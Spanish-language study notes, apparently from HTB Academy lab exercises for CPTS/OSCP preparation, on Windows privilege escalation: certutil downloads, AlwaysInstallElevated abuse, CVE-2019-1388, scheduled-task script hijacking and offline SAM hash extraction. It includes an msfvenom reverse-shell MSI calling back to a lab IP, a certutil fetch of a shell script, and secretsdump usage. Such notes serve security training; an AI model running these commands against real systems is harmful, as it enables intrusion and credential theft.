
Esta sección presenta diferentes técnicas de escalada de privilegios y postexplotación en Windows:

- LOLBAS (Living Off The Land Binaries and Scripts).
    
- AlwaysInstallElevated.
    
- CVE-2019-1388 (UAC).
    
- Abuso de tareas programadas.
    
- Enumeración de descripciones de usuarios y equipos.
    
- Montaje de discos virtuales VHD, VHDX y VMDK.
    
- Extracción de hashes desde copias de seguridad.

## 1. LOLBAS (Living Off The Land)

**LOLBAS** es un proyecto que documenta binarios, scripts y librerías legítimos de Microsoft que pueden utilizarse para realizar acciones distintas de aquellas para las que fueron diseñados.

Algunas funcionalidades interesantes:

- Ejecución de código.
    
- Transferencia de archivos.
    
- Codificación y decodificación.
    
- Bypass de UAC.
    
- Persistencia.
    
- Evasión.
    
- DLL Hijacking.
    

### 1.1. Certutil: transferencia de archivos

`certutil.exe` es una herramienta de Windows utilizada para gestionar certificados, pero también permite descargar archivos.

```
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```

Parámetros:

- `-urlcache`: utiliza las funcionalidades de caché de URL.
    
- `-split`: procesa el contenido descargado.
    
- `-f`: fuerza la operación.
    

### 1.2. Codificar archivos en Base64

```
certutil -encode file1 encodedfile
```

### 1.3. Decodificar archivos Base64

```
certutil -decode encodedfile file2
```

Esto permite transferir archivos mediante su representación en Base64 cuando otros métodos no están disponibles.

### 1.4. Rundll32

`rundll32.exe` permite ejecutar funciones exportadas por librerías DLL.

Academy lo menciona como otra herramienta legítima que puede utilizarse para ejecutar código mediante DLL.

**Importante:** una DLL necesita una función exportada compatible; `rundll32.exe` no ejecuta cualquier DLL automáticamente.

## 2. AlwaysInstallElevated

Esta vulnerabilidad aparece cuando Windows Installer está configurado para permitir instalaciones MSI con privilegios elevados.

Para que la técnica funcione, deben estar habilitadas **ambas políticas**:

```
Computer Configuration\Administrative Templates\Windows Components\Windows Installer

User Configuration\Administrative Templates\Windows Components\Windows Installer
```

### 2.1. Enumerar AlwaysInstallElevated

Comprobar la configuración del usuario:

```
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```

Comprobar la configuración del equipo:

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Resultado vulnerable:

```
AlwaysInstallElevated    REG_DWORD    0x1
```

**Ambas claves deben tener el valor** `**0x1**`**.**

### 2.2. Generar un MSI

En el laboratorio, Academy utiliza `msfvenom` para generar un paquete MSI que establece una conexión inversa:

```
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
```

Parámetros:

- `-p`: payload.
    
- `lhost`: IP de nuestra máquina.
    
- `lport`: puerto de escucha.
    
- `-f msi`: formato MSI.
    

### 2.3. Ejecutar el MSI

Después de transferirlo al objetivo:

```
msiexec /i C:\Users\htb-student\Desktop\aie.msi /quiet /qn /norestart
```

Parámetros:

- `/i`: instala el paquete.
    
- `/quiet`: instalación silenciosa.
    
- `/qn`: sin interfaz gráfica.
    
- `/norestart`: evita reiniciar el sistema.
    

### 2.4. Recibir la conexión

En Kali:

```
nc -lnvp 9443
```

Comprobar los privilegios:

```
whoami
```

Resultado esperado:

```
nt authority\system
```

**Clave para el examen:** si encontramos `AlwaysInstallElevated = 0x1` en HKCU y HKLM, debemos considerar este vector de escalada a SYSTEM.

## 3. CVE-2019-1388: bypass de UAC

**CVE-2019-1388** es una vulnerabilidad del diálogo de certificados de Windows que permitía ejecutar procesos con privilegios elevados.

El problema estaba relacionado con el mecanismo UAC y los enlaces incluidos en determinados certificados digitales.

### Funcionamiento

Academy utiliza el ejecutable:

```
hhupd.exe
```

Este ejecutable estaba firmado con un certificado que incluía un enlace en el campo `SpcSpAgencyInfo`.

La vulnerabilidad permitía abrir un navegador desde el diálogo de certificados con privilegios de `NT AUTHORITY\SYSTEM`.

### Procedimiento del laboratorio

1. Localizar `hhupd.exe`.
    
2. Seleccionar **Run as administrator**.
    
3. En el diálogo UAC, abrir **Show information about the publisher's certificate**.
    
4. Acceder a la pestaña **General**.
    
5. Pulsar el enlace del campo **Issued by**.
    
6. Se abre una ventana del navegador.
    
7. Utilizar **View page source**.
    
8. Abrir el diálogo **Save as**.
    
9. Introducir la ruta:
    

```
C:\Windows\System32\cmd.exe
```

10. Ejecutar el programa y comprobar los privilegios:
    

```
whoami
```

Resultado:

```
nt authority\system
```

### Consideraciones

- Microsoft corrigió esta vulnerabilidad en noviembre de 2019.
    
- Requiere un sistema vulnerable y acceso a una interfaz gráfica.
    
- El comportamiento puede variar dependiendo del navegador.
    

**Clave para el examen:** comprobar la versión y los parches de Windows antes de intentar explotar vulnerabilidades conocidas de UAC.

## 4. Tareas programadas (Scheduled Tasks)

Las tareas programadas pueden ejecutar scripts y programas automáticamente utilizando cuentas privilegiadas.

Si encontramos una tarea que se ejecuta como administrador o SYSTEM y podemos modificar el archivo que ejecuta, podríamos conseguir una escalada de privilegios.

### 4.1. Enumerar tareas programadas con CMD

```
schtasks /query /fo LIST /v
```

Parámetros:

- `/query`: enumera tareas.
    
- `/fo LIST`: muestra los resultados en formato lista.
    
- `/v`: proporciona información detallada.
    

Campos interesantes:

```
TaskName
Task To Run
Run As User
Next Run Time
Last Run Time
```

Especialmente:

```
Run As User: SYSTEM
```

### 4.2. Enumerar tareas con PowerShell

```
Get-ScheduledTask | Select-Object TaskName, State
```

Para consultar información adicional de las tareas accesibles:

```
Get-ScheduledTask | Select-Object TaskName, TaskPath, State, Actions, Principal
```

### 4.3. Limitaciones

Un usuario sin privilegios puede no tener acceso a todas las tareas programadas.

Los archivos de tareas se almacenan en:

```
C:\Windows\System32\Tasks
```

Los permisos de este directorio suelen impedir que los usuarios estándar lean o modifiquen determinadas tareas.

## 5. Abuso de scripts ejecutados por tareas programadas

Supongamos que encontramos el siguiente directorio:

```
C:\Scripts\
```

Contiene:

```
db-backup.ps1
mailbox-backup.ps1
```

Si una tarea programada ejecuta alguno de estos scripts como SYSTEM y nuestro usuario puede modificarlo, existe un posible vector de escalada de privilegios.

### 5.1. Comprobar permisos con AccessChk

```
accesschk64.exe /accepteula -s -d C:\Scripts\
```

Ejemplo:

```
C:\Scripts
  RW BUILTIN\Users
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```

Esto indica que `BUILTIN\Users` tiene permisos de lectura y escritura sobre el directorio.

**Importante:** también debemos comprobar los permisos de los archivos concretos, no solamente los del directorio.

### 5.2. Comprobar permisos con ICACLS

```
icacls C:\Scripts
```

Para revisar los scripts:

```
icacls C:\Scripts\*.ps1
```

Permisos interesantes:

| Permiso | Significado                    |
| ------- | ------------------------------ |
| `(F)`   | Full Control                   |
| `(M)`   | Modify                         |
| `(W)`   | Write                          |
| `(WD)`  | Write Data / Add File          |
| `(AD)`  | Append Data / Add Subdirectory |
| `(RX)`  | Read & Execute                 |
| `(I)`   | Permiso heredado               |
| `(OI)`  | Herencia a archivos            |
| `(CI)`  | Herencia a subdirectorios      |

**Ojo:** tener `(WD)` sobre un directorio permite crear archivos, pero no garantiza que podamos modificar los archivos existentes.

### 5.3. Condiciones necesarias

Para aprovechar este escenario necesitamos:

1. Encontrar una tarea programada.
    
2. Identificar qué script o ejecutable utiliza.
    
3. Comprobar con qué usuario se ejecuta.
    
4. Verificar si podemos modificar el archivo ejecutado.
    
5. Confirmar que la tarea se ejecutará nuevamente.
    

Academy describe un escenario en el que se modifica un script de backup ejecutado periódicamente y posteriormente se obtiene ejecución como SYSTEM.

**Clave para CPTS/OSCP:** no basta con encontrar un directorio escribible. Debemos identificar qué proceso privilegiado utiliza los archivos de ese directorio.

## 6. Descripciones de usuarios y equipos

Los administradores pueden almacenar información sensible accidentalmente en los campos de descripción de usuarios o equipos.

En ocasiones pueden aparecer:

- Contraseñas.
    
- Información sobre cuentas de servicio.
    
- Nombres de servidores.
    
- Detalles de infraestructura.
    

### 6.1. Enumerar usuarios locales

```
Get-LocalUser
```

Para mostrar únicamente nombres y descripciones:

```
Get-LocalUser | Select-Object Name, Enabled, Description
```

Ejemplo:

```
Name        Enabled Description
----        ------- -----------
Administrator True  Built-in account
helpdesk      True
secsvc        True  Network scanner - do not change password
sql_dev       True
```

### 6.2. Consultar la descripción del equipo

```
Get-WmiObject -Class Win32_OperatingSystem | Select-Object Description
```

Ejemplo:

```
Description
-----------
The most vulnerable box ever!
```

**Clave para el examen:** revisar siempre los campos de descripción, tanto de usuarios locales como de objetos de Active Directory cuando tengamos acceso al dominio.

## 7. Archivos VHD, VHDX y VMDK

Durante la enumeración podemos encontrar copias de discos virtuales almacenadas localmente o en recursos compartidos.

Extensiones interesantes:

|Extensión|Descripción|
|---|---|
|`.vhd`|Virtual Hard Disk|
|`.vhdx`|Virtual Hard Disk v2|
|`.vmdk`|VMware Virtual Machine Disk|

Estos archivos pueden contener sistemas operativos completos, incluyendo configuraciones y credenciales.

### 7.1. Buscar discos virtuales

Podemos utilizar herramientas como **Snaffler** para localizar archivos interesantes en recursos compartidos.

También podemos buscarlos manualmente desde PowerShell:

```
Get-ChildItem C:\ -Recurse -Include *.vhd,*.vhdx,*.vmdk -File -ErrorAction SilentlyContinue
```

### 7.2. Montar VMDK en Linux

Crear el directorio de montaje:

```
sudo mkdir -p /mnt/vmdk
```

Montar el disco:

```
sudo guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```

Parámetros:

- `-a`: archivo de disco virtual.
    
- `-i`: detecta automáticamente el sistema operativo.
    
- `--ro`: monta el disco en modo solo lectura.
    

### 7.3. Montar VHD/VHDX en Linux

Crear el directorio:

```
sudo mkdir -p /mnt/vhdx
```

Montar el disco:

```
sudo guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1
```

Parámetros:

- `--add`: añade el disco.
    
- `--ro`: solo lectura.
    
- `-m`: partición que queremos montar.
    

**Nota:** `/dev/sda1` es la partición utilizada en el ejemplo; puede variar según el disco.

### 7.4. Montar discos virtuales en Windows

Para archivos `.vhd` o `.vhdx` podemos utilizar:

- Clic derecho → **Mount**.
    
- **Disk Management**.
    
- PowerShell con `Mount-VHD`, cuando esté disponible.
    

Ejemplo:

```
Mount-VHD -Path "C:\Backups\WEBSRV10.vhdx" -ReadOnly
```

Para archivos `.vmdk` podemos utilizar VMware Workstation y su funcionalidad **Map Virtual Disks**.

Una vez montados, podemos explorar el sistema de archivos del disco.

## 8. Extracción de hashes desde discos virtuales

Si encontramos un backup de Windows, podemos buscar los archivos del registro:

```
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
```

### Función de cada archivo

|Archivo|Contenido|
|---|---|
|`SAM`|Información y hashes de cuentas locales|
|`SYSTEM`|Información necesaria para descifrar los datos protegidos de SAM|
|`SECURITY`|Secretos LSA y otra información de seguridad|

### 8.1. Extraer hashes con SecretsDump

Una vez obtenidos los tres archivos del backup:

```
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

Parámetros:

- `-sam`: hive SAM.
    
- `-security`: hive SECURITY.
    
- `-system`: hive SYSTEM.
    
- `LOCAL`: procesamiento offline de los archivos locales.
    

Ejemplo de resultado:

```
[*] Target system bootKey: 0x35fb33959c691334c2e4297207eeeeba

[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)

Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
```

Formato:

```
Username:RID:LMHash:NTHash:::
```

### ¿Por qué es interesante?

Podemos recuperar hashes de cuentas locales desde una copia de seguridad sin necesitar una sesión activa en el sistema original.

Esto puede resultar útil si:

- El administrador local reutiliza contraseñas.
    
- El backup contiene información de una máquina importante.
    
- No conseguimos escalar privilegios directamente en el sistema objetivo.

### 1. Comprobar AlwaysInstallElevated

```
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Buscar:

```
AlwaysInstallElevated    REG_DWORD    0x1
```

### 2. Enumerar tareas programadas

```
schtasks /query /fo LIST /v
```

```
Get-ScheduledTask | Select-Object TaskName, State, Actions, Principal
```

### 3. Comprobar permisos de scripts y directorios

```
icacls C:\Scripts
```

```
accesschk64.exe /accepteula -s -d C:\Scripts\
```

### 4. Revisar descripciones de usuarios

```
Get-LocalUser | Select-Object Name, Description
```

### 5. Revisar descripción del equipo

```
Get-WmiObject -Class Win32_OperatingSystem | Select-Object Description
```

### 6. Buscar discos virtuales

```
Get-ChildItem C:\ -Recurse -Include *.vhd,*.vhdx,*.vmdk -File -ErrorAction SilentlyContinue
```

### 7. Montar discos virtuales encontrados

VMDK:

```
sudo guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```

VHDX:

```
sudo guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1
```

### 8. Analizar backups de Windows

Buscar:

```
Windows\System32\config\SAM
Windows\System32\config\SYSTEM
Windows\System32\config\SECURITY
```

Extraer hashes:

```
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

## 11. Puntos clave para el examen

- **LOLBAS:** permite aprovechar herramientas legítimas de Windows para realizar operaciones útiles durante una evaluación.
    
- **Certutil:** permite descargar archivos y codificar/decodificar Base64.
    
- **AlwaysInstallElevated:** requiere `0x1` tanto en HKCU como en HKLM.
    
- **MSI:** puede ejecutarse con privilegios SYSTEM si AlwaysInstallElevated está configurado de forma insegura.
    
- **CVE-2019-1388:** vulnerabilidad histórica del diálogo de certificados y UAC.
    
- **Scheduled Tasks:** buscar tareas que ejecuten scripts modificables con privilegios elevados.
    
- **AccessChk e ICACLS:** permiten revisar permisos de archivos y directorios.
    
- **Get-LocalUser:** permite revisar descripciones de cuentas locales.
    
- **Get-WmiObject Win32_OperatingSystem:** permite consultar la descripción del equipo.
    
- **VHD/VHDX/VMDK:** pueden contener copias completas de sistemas Windows.
    
- **guestmount:** permite montar discos virtuales desde Linux.
    
- **SAM + SYSTEM + SECURITY:** archivos importantes para extraer credenciales desde backups.
    
- **SecretsDump:** permite obtener hashes y otros secretos de los hives del registro.
    

**Idea principal:** cuando no encontramos una escalada de privilegios directa, debemos revisar configuraciones de Windows, tareas programadas, permisos débiles y copias de seguridad. Un script modificable ejecutado como SYSTEM o un disco virtual con información sensible puede proporcionarnos un nuevo vector de ataque.
